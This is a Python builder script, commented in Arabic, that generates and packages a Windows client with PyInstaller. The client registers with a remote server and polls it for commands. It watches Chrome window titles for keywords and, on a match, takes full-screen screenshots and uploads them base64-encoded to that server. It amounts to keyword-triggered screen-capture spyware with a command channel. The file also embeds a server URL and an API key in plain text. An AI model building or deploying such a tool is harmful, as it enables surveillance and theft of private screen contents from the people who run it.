#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ProjectSender - EXE Builder v4
بناء ملفات EXE مع مراقبة الكلمات المفتاحية
"""

import os
import sys
import json
import base64
import requests
import subprocess
import tempfile
import shutil
from pathlib import Path

# ==================== التكوين ====================

SERVER_URL = "https://sender-production-7ee8.up.railway.app"
USER_API_KEY = "skpro_user_aB7cD2eF5gH8iJ3kL6mN9oP4qR1sT5uV"

# ==================== إنشاء Client Script ====================

def create_client_script(exe_id, keywords, photo_count, temp_dir):
    """إنشاء client script مع الكلمات المفتاحية المدمجة"""
    
    # قائمة الكلمات المفتاحية كـ Python list
    keywords_list = json.dumps(keywords)
    
    client_code = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
ProjectSender Client - Auto-generated
EXE ID: {exe_id}
Keywords: {keywords}
Photos per Keyword: {photo_count}
"""

import tkinter as tk
from tkinter import ttk
import threading
import time
import uuid
import requests
import base64
import json
from PIL import ImageGrab
from datetime import datetime
import subprocess
import sys

# ==================== التكوين ====================

SERVER_URL = "{SERVER_URL}"
USER_API_KEY = "{USER_API_KEY}"

# ==================== Client Class ====================

class ProjectSenderClient:
    def __init__(self, root):
        self.root = root
        self.root.title("ProjectSender Client")
        self.root.geometry("600x400")
        self.root.configure(bg="#1e1e1e")
        
        self.is_running = True
        self.screenshot_thread = None
        self.heartbeat_thread = None
        self.command_thread = None
        
        # ✅ إنشاء client_id فريد
        self.client_id = str(uuid.uuid4())
        self.keywords = {keywords_list}
        self.photo_count = {photo_count}
        self.keyword_index = 0
        self.photos_captured = 0
        
        self.create_ui()
        
        # ✅ تسجيل العميل
        self.register_client()
        
        # ✅ بدء الخيط الخاص بالنبض
        self.start_heartbeat()
        
        # ✅ بدء خيط استقبال الأوامر
        self.start_command_listener()
        
        # ✅ بدء التقاط الصور
        self.start_capture()
    
    def create_ui(self):
        """إنشاء الواجهة الرسومية"""
        
        # العنوان
        title_label = tk.Label(
            self.root,
            text="📸 ProjectSender Client",
            font=("Arial", 16, "bold"),
            bg="#1e1e1e",
            fg="#00ff88"
        )
        title_label.pack(pady=20)
        
        # معلومات
        info_frame = tk.Frame(self.root, bg="#2d2d2d")
        info_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        tk.Label(info_frame, text="Status:", bg="#2d2d2d", fg="#ffffff", font=("Arial", 11, "bold")).pack(anchor=tk.W, pady=5)
        self.status_label = tk.Label(info_frame, text="🟢 Registering...", bg="#2d2d2d", fg="#ffff00", font=("Arial", 11))
        self.status_label.pack(anchor=tk.W, pady=5)
        
        tk.Label(info_frame, text="Client ID:", bg="#2d2d2d", fg="#ffffff", font=("Arial", 11, "bold")).pack(anchor=tk.W, pady=5)
        self.client_id_label = tk.Label(info_frame, text=self.client_id[:16], bg="#2d2d2d", fg="#00ff88", font=("Arial", 10))
        self.client_id_label.pack(anchor=tk.W, pady=5)
        
        tk.Label(info_frame, text="Keywords:", bg="#2d2d2d", fg="#ffffff", font=("Arial", 11, "bold")).pack(anchor=tk.W, pady=5)
        self.keywords_label = tk.Label(info_frame, text=", ".join(self.keywords) if self.keywords else "Waiting...", bg="#2d2d2d", fg="#ffff00", font=("Arial", 10))
        self.keywords_label.pack(anchor=tk.W, pady=5)
        
        tk.Label(info_frame, text="Current Keyword:", bg="#2d2d2d", fg="#ffffff", font=("Arial", 11, "bold")).pack(anchor=tk.W, pady=5)
        self.current_keyword_label = tk.Label(info_frame, text="None", bg="#2d2d2d", fg="#00ff88", font=("Arial", 10))
        self.current_keyword_label.pack(anchor=tk.W, pady=5)
        
        tk.Label(info_frame, text="Photos Captured:", bg="#2d2d2d", fg="#ffffff", font=("Arial", 11, "bold")).pack(anchor=tk.W, pady=5)
        self.photos_label = tk.Label(info_frame, text="0", bg="#2d2d2d", fg="#00ff88", font=("Arial", 10))
        self.photos_label.pack(anchor=tk.W, pady=5)
        
        # أزرار
        buttons_frame = tk.Frame(self.root, bg="#1e1e1e")
        buttons_frame.pack(fill=tk.X, padx=20, pady=20)
        
        stop_btn = tk.Button(
            buttons_frame,
            text="⏹ Stop",
            bg="#cc0000",
            fg="white",
            command=self.stop,
            padx=20,
            pady=10
        )
        stop_btn.pack(side=tk.LEFT, padx=5)
    
    def register_client(self):
        """تسجيل العميل في الخادم"""
        try:
            headers = {{"X-API-Key": USER_API_KEY}}
            data = {{
                "client_id": self.client_id,
                "computer": "ProjectSender Client",
                "status": "online"
            }}
            
            response = requests.post(
                f"{{SERVER_URL}}/api/register",
                json=data,
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"✅ Client registered: {{self.client_id}}")
                self.status_label.config(text="🟢 Running", fg="#00ff00")
            else:
                print(f"❌ Registration failed: {{response.status_code}}")
                self.status_label.config(text="🔴 Registration failed", fg="#ff0000")
        except Exception as e:
            print(f"❌ Registration error: {{str(e)}}")
            self.status_label.config(text="🔴 Connection error", fg="#ff0000")
    
    def send_heartbeat(self):
        """إرسال نبض دوري"""
        while self.is_running:
            try:
                headers = {{"X-API-Key": USER_API_KEY}}
                data = {{
                    "client_id": self.client_id,
                    "status": "online",
                    "task": "capturing",
                    "photos_count": self.photos_captured
                }}
                
                response = requests.post(
                    f"{{SERVER_URL}}/api/heartbeat",
                    json=data,
                    headers=headers,
                    timeout=10
                )
                
                if response.status_code != 200:
                    print(f"❌ Heartbeat failed: {{response.status_code}}")
            except:
                pass
            
            time.sleep(30)  # إرسال نبض كل 30 ثانية
    
    def start_heartbeat(self):
        """بدء خيط النبض"""
        self.heartbeat_thread = threading.Thread(target=self.send_heartbeat, daemon=True)
        self.heartbeat_thread.start()
    
    def listen_for_commands(self):
        """الاستماع للأوامر من الخادم"""
        while self.is_running:
            try:
                headers = {{"X-API-Key": USER_API_KEY}}
                response = requests.get(
                    f"{{SERVER_URL}}/api/get_command/{{self.client_id}}",
                    headers=headers,
                    timeout=10
                )
                
                if response.status_code == 200:
                    command = response.json()
                    
                    if command.get("command") == "monitor_keywords":
                        self.keywords = command.get("keywords", [])
                        self.keyword_index = 0
                        keywords_text = ", ".join(self.keywords)
                        self.keywords_label.config(text=keywords_text)
                        print(f"✅ Keywords received: {{keywords_text}}")
            except:
                pass
            
            time.sleep(10)  # التحقق من الأوامر كل 10 ثواني
    
    def start_command_listener(self):
        """بدء خيط استقبال الأوامر"""
        self.command_thread = threading.Thread(target=self.listen_for_commands, daemon=True)
        self.command_thread.start()
    
    def get_browser_url(self):
        """الحصول على URL من المتصفح الحالي"""
        try:
            # محاولة الحصول على URL من Chrome
            result = subprocess.run(
                ["powershell", "-Command", 
                 "Get-Process chrome -ErrorAction SilentlyContinue | Select-Object -ExpandProperty MainWindowTitle"],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.stdout.strip()
        except:
            return ""
    
    def check_keyword_in_browser(self):
        """التحقق من وجود الكلمة المفتاحية في عنوان المتصفح"""
        if not self.keywords:
            return False
        
        current_keyword = self.keywords[self.keyword_index]
        browser_title = self.get_browser_url()
        
        # البحث عن الكلمة المفتاحية (بدون حساسية للأحرف الكبيرة والصغيرة)
        if current_keyword.lower() in browser_title.lower():
            self.current_keyword_label.config(text=f"✅ {{current_keyword}}")
            return True
        else:
            self.current_keyword_label.config(text=f"⏳ {{current_keyword}}")
            return False
    
    def start_capture(self):
        """بدء التقاط الصور"""
        self.screenshot_thread = threading.Thread(target=self.capture_loop, daemon=True)
        self.screenshot_thread.start()
    
    def capture_loop(self):
        """حلقة التقاط الصور"""
        while self.is_running:
            try:
                # إذا كانت هناك كلمات مفتاحية، استخدمها
                if self.keywords:
                    if self.check_keyword_in_browser():
                        # التقاط صور للكلمة الحالية
                        for i in range(self.photo_count):
                            if not self.is_running:
                                break
                            
                            screenshot = ImageGrab.grab()
                            import io
                            buffer = io.BytesIO()
                            screenshot.save(buffer, format='PNG')
                            image_data = base64.b64encode(buffer.getvalue()).decode()
                            
                            try:
                                headers = {{"X-API-Key": USER_API_KEY}}
                                data = {{
                                    "client_id": self.client_id,
                                    "filename": f"{{self.keywords[self.keyword_index]}}_{{i:04d}}_{{datetime.now().timestamp()}}.png",
                                    "image_base64": image_data,
                                    "timestamp": datetime.now().timestamp()
                                }}
                                
                                response = requests.post(
                                    f"{{SERVER_URL}}/api/upload_screenshot",
                                    json=data,
                                    headers=headers,
                                    timeout=10
                                )
                                
                                if response.status_code == 200:
                                    self.photos_captured += 1
                                    self.photos_label.config(text=str(self.photos_captured))
                                    print(f"✅ Screenshot uploaded: {{i+1}}/{{self.photo_count}}")
                                else:
                                    print(f"❌ Upload failed: {{response.status_code}}")
                            except Exception as e:
                                print(f"❌ Upload error: {{str(e)}}")
                            
                            time.sleep(0.5)  # تأخير بين الصور
                        
                        # الانتقال إلى الكلمة التالية
                        self.keyword_index = (self.keyword_index + 1) % len(self.keywords)
            except Exception as e:
                print(f"❌ Capture error: {{str(e)}}")
            
            time.sleep(1)  # تأخير قبل الفحص التالي
    
    def stop(self):
        """إيقاف التطبيق"""
        self.is_running = False
        self.root.quit()

# ==================== البرنامج الرئيسي ====================

if __name__ == "__main__":
    root = tk.Tk()
    app = ProjectSenderClient(root)
    root.mainloop()
'''
    
    # حفظ الملف
    client_file = os.path.join(temp_dir, "client_auto.py")
    with open(client_file, "w", encoding="utf-8") as f:
        f.write(client_code)
    
    print(f"✅ Client script created: {client_file}")
    return client_file

# ==================== بناء EXE ====================

def build_exe_with_pyinstaller(client_file, exe_id, temp_dir, output_file):
    """بناء EXE باستخدام PyInstaller"""
    
    print("🔨 Building EXE with PyInstaller...")
    
    # التحقق من PyInstaller
    try:
        import PyInstaller
    except ImportError:
        print("⚠️  PyInstaller not found. Installing...")
        install_result = subprocess.run(
            [sys.executable, "-m", "pip", "install", "pyinstaller"],
            capture_output=True,
            text=True
        )
        if install_result.returncode != 0:
            print(f"❌ Failed to install PyInstaller")
            return False
        print("✅ PyInstaller installed successfully")
    
    # بناء EXE
    env = os.environ.copy()
    env['PYTHONIOENCODING'] = 'utf-8'
    
    result = subprocess.run(
        [
            sys.executable, "-m", "PyInstaller",
            "--onefile",
            "--windowed",
            "--name", f"ProjectSender_Client_{exe_id[:8]}",
            "--distpath", os.path.join(temp_dir, "dist"),
            "--buildpath", os.path.join(temp_dir, "build"),
            "--specpath", os.path.join(temp_dir, "spec"),
            client_file
        ],
        cwd=temp_dir,
        capture_output=True,
        text=True,
        env=env
    )
    
    if result.returncode != 0:
        print(f"❌ Build failed")
        if result.stderr:
            print(f"Error: {result.stderr[:500]}")
        return False
    
    # البحث عن EXE
    dist_path = os.path.join(temp_dir, "dist")
    if os.path.exists(dist_path):
        for file in os.listdir(dist_path):
            if file.endswith('.exe'):
                exe_path = os.path.join(dist_path, file)
                shutil.copy(exe_path, output_file)
                print(f"✅ EXE created: {output_file}")
                return True
    
    print(f"❌ EXE not found in dist folder")
    return False

def build_exe_simple(client_file, exe_id, temp_dir, output_file):
    """بناء EXE بطريقة بسيطة - نسخ الملف مباشرة"""
    
    print("📦 Creating simple executable wrapper...")
    
    # نسخ الملف Python كـ .py
    py_file = output_file.replace('.exe', '.py')
    shutil.copy(client_file, py_file)
    print(f"✅ Python file created: {py_file}")
    print("⚠️  Note: Run with: python client.py")
    
    # إنشاء batch file
    batch_content = f'''@echo off
python "{py_file}" %*
'''
    
    batch_file = output_file.replace('.exe', '.bat')
    with open(batch_file, "w", encoding="utf-8") as f:
        f.write(batch_content)
    
    print(f"✅ Batch file created: {batch_file}")
    
    return True

def build_exe(exe_id, keywords, photo_count, output_file):
    """بناء EXE"""
    
    with tempfile.TemporaryDirectory() as temp_dir:
        print(f"📁 Temp directory: {temp_dir}")
        
        # إنشاء client script
        client_file = create_client_script(exe_id, keywords, photo_count, temp_dir)
        
        # محاولة البناء بـ PyInstaller أولاً
        print("\n🔨 Attempting to build with PyInstaller...")
        if build_exe_with_pyinstaller(client_file, exe_id, temp_dir, output_file):
            return True
        
        print("\n⚠️  PyInstaller failed. Trying simple method...")
        if build_exe_simple(client_file, exe_id, temp_dir, output_file):
            return True
        
        print("\n❌ All build methods failed")
        return False

# ==================== الدالة الرئيسية ====================

def main():
    """البرنامج الرئيسي"""
    
    if len(sys.argv) < 3:
        print("Usage: python build_exe_from_config_v4.py <exe_id> <output_file>")
        sys.exit(1)
    
    exe_id = sys.argv[1]
    output_file = sys.argv[2]
    
    print(f"🔨 Building EXE for {exe_id}")
    print(f"📁 Output: {output_file}")
    
    # جلب الإعدادات من الخادم
    try:
        headers = {"X-API-Key": USER_API_KEY}
        response = requests.get(
            f"{SERVER_URL}/api/exe_config/{exe_id}",
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            config = response.json()
            # Extract keywords from pages
            pages = config.get("pages", [])
            keywords = [page.get("name", "default") for page in pages]
            # Get photo_count from first page (or use 50 as default)
            photo_count = pages[0].get("photo_count", 50) if pages else 50
            print(f"✅ Config loaded: {keywords}, {photo_count} photos per keyword")
        else:
            print(f"⚠️  Failed to load config: {response.status_code}")
            keywords = ["default"]
            photo_count = 50
    except Exception as e:
        print(f"⚠️  Error loading config: {str(e)}")
        keywords = ["default"]
        photo_count = 50
    
    if build_exe(exe_id, keywords, photo_count, output_file):
        print(f"\n✅ Build completed successfully!")
        sys.exit(0)
    else:
        print(f"\n❌ Build failed!")
        sys.exit(1)

if __name__ == "__main__":
    main()
